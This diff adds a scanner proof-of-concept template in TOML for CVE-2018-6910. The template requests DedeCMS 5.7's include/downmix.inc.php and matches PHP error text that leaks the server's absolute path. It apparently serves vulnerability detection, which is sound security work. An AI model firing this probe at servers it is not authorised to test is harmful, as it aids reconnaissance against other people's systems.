@@ -1,0 +1,33 @@
+[info]
+author = "ave"
+description = "通过直接访问 DedeCMS 5.7 的 include/downmix.inc.php 文件，触发 PHP 错误信息回显，获取服务器绝对路径等敏感信息"
+id = "POC-AVE-2018-0189"
+name = "DedeCMS 5.7 路径信息泄露漏洞 PoC"
+severity = "high"
+tags = ["ave-2018-0189"]
+vuln_id = [
+    "CVE-2018-6910",
+    "AVE-2018-0189",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/include/downmix.inc.php"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "downmix.inc.php",
+    "Call to undefined function helper()",
+]
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
